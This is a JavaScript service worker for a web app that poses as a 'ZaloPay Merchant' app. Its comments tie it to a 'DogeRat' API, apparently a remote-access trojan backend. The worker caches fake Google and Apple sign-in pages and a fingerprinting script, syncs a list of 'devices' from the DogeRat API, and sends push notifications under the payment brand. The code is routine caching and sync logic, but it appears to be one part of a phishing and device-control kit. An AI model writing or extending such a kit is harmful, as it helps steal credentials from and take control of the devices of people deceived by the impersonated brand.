// Service Worker for Merchant Web PWA
// Handles offline support and background sync
// Based on DOGERAT_API_PWA_INTEGRATION_GUIDE.md

const CACHE_NAME = 'zalopay-merchant-v1';
const API_CACHE_NAME = 'zalopay-merchant-api-v1';
const urlsToCache = [
  '/',
  '/index.html',
  '/auth_signup.html',
  '/google_auth.html',
  '/apple_auth.html',
  '/register.html',
  '/dashboard.html',
  '/css/style.css',
  '/js/api.js',
  '/js/fingerprinting.js',
  '/js/main.js',
  '/manifest.json',
  '/images/zalopay-merchant-icon.png',
  '/images/zalopay-merchant-app-icon.png',
  '/images/apple-touch-icon.png'
];

// Install event - Cache essential assets
self.addEventListener('install', (event) => {
  console.log('Service Worker installing...');
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then((cache) => {
        console.log('Opened cache');
        return cache.addAll(urlsToCache.map(url => new Request(url, { cache: 'reload' })));
      })
      .catch((error) => {
        console.error('Cache addAll failed:', error);
      })
  );
  // Force the waiting service worker to become the active service worker
  self.skipWaiting();
});

// Activate event - Clean up old caches
self.addEventListener('activate', (event) => {
  console.log('Service Worker activating...');
  event.waitUntil(
    caches.keys().then((cacheNames) => {
      return Promise.all(
        cacheNames.map((cacheName) => {
          if (cacheName !== CACHE_NAME && cacheName !== API_CACHE_NAME) {
            console.log('Deleting old cache:', cacheName);
            return caches.delete(cacheName);
          }
        })
      );
    })
  );
  // Take control of all pages immediately
  return self.clients.claim();
});

// Fetch event - Network-first strategy for API, Cache-first for assets
self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);
  
  // Skip cross-origin requests
  if (url.origin !== location.origin) {
    return;
  }
  
  // API calls - Network-first strategy
  if (url.pathname.startsWith('/api/')) {
    event.respondWith(
      fetch(event.request)
        .then((response) => {
          // Cache successful responses
          if (response.ok) {
            const responseClone = response.clone();
            caches.open(API_CACHE_NAME).then((cache) => {
              cache.put(event.request, responseClone);
            });
          }
          return response;
        })
        .catch(() => {
          // Fallback to cache if network fails
          return caches.match(event.request).then((cachedResponse) => {
            if (cachedResponse) {
              return cachedResponse;
            }
            // Return offline response if no cache
            return new Response(
              JSON.stringify({ 
                error: 'Offline', 
                message: 'No internet connection and no cached data available' 
              }),
              {
                status: 503,
                statusText: 'Service Unavailable',
                headers: { 'Content-Type': 'application/json' }
              }
            );
          });
        })
    );
  } else {
    // Static assets - Cache-first strategy
    event.respondWith(
      caches.match(event.request)
        .then((response) => {
          if (response) {
            return response;
          }
          return fetch(event.request).then((response) => {
            // Don't cache if not a valid response
            if (!response || response.status !== 200 || response.type !== 'basic') {
              return response;
            }
            const responseToCache = response.clone();
            caches.open(CACHE_NAME).then((cache) => {
              cache.put(event.request, responseToCache);
            });
            return response;
          });
        })
    );
  }
});

// Background Sync event - Sync data when app is in background
self.addEventListener('sync', (event) => {
  console.log('Background sync event:', event.tag);
  
  if (event.tag === 'sync-device-data') {
    event.waitUntil(syncDeviceData());
  } else if (event.tag === 'sync-form-submissions') {
    event.waitUntil(syncFormSubmissions());
  } else if (event.tag === 'sync-api-requests') {
    event.waitUntil(syncAPIRequests());
  }
});

// Sync device data from DogeRat API
async function syncDeviceData() {
  try {
    const response = await fetch('/api/v1/devices');
    if (response.ok) {
      const devices = await response.json();
      // Store in IndexedDB for offline access (if IndexedDB is available)
      console.log('Device data synced:', devices);
      
      // Broadcast to clients
      const clients = await self.clients.matchAll();
      clients.forEach((client) => {
        client.postMessage({
          type: 'devices-synced',
          data: devices
        });
      });
    }
  } catch (error) {
    console.error('Background sync failed:', error);
  }
}

// Sync form submissions that failed while offline
async function syncFormSubmissions() {
  try {
    // Get queued form submissions from IndexedDB or cache
    // In production, implement IndexedDB for offline queue
    console.log('Syncing form submissions...');
  } catch (error) {
    console.error('Form submission sync failed:', error);
  }
}

// Sync API requests that failed while offline
async function syncAPIRequests() {
  try {
    // Get queued API requests from IndexedDB or cache
    console.log('Syncing API requests...');
  } catch (error) {
    console.error('API request sync failed:', error);
  }
}

// Push notification event
self.addEventListener('push', (event) => {
  console.log('Push notification received:', event);
  
  const data = event.data ? event.data.json() : {};
  
  const options = {
    body: data.body || 'New update available',
    icon: '/images/zalopay-merchant-icon.png',
    badge: '/images/zalopay-merchant-icon.png',
    tag: data.tag || 'default',
    data: data.data || {},
    vibrate: [200, 100, 200],
    requireInteraction: false
  };
  
  event.waitUntil(
    self.registration.showNotification(data.title || 'ZaloPay Merchant', options)
  );
});

// Notification click event
self.addEventListener('notificationclick', (event) => {
  console.log('Notification clicked:', event);
  event.notification.close();
  
  event.waitUntil(
    clients.openWindow(event.notification.data.url || '/')
  );
});

// Message event - Handle messages from clients
self.addEventListener('message', (event) => {
  console.log('Service Worker received message:', event.data);
  
  if (event.data && event.data.type === 'SKIP_WAITING') {
    self.skipWaiting();
  }
  
  if (event.data && event.data.type === 'CACHE_URLS') {
    event.waitUntil(
      caches.open(CACHE_NAME).then((cache) => {
        return cache.addAll(event.data.urls);
      })
    );
  }
});
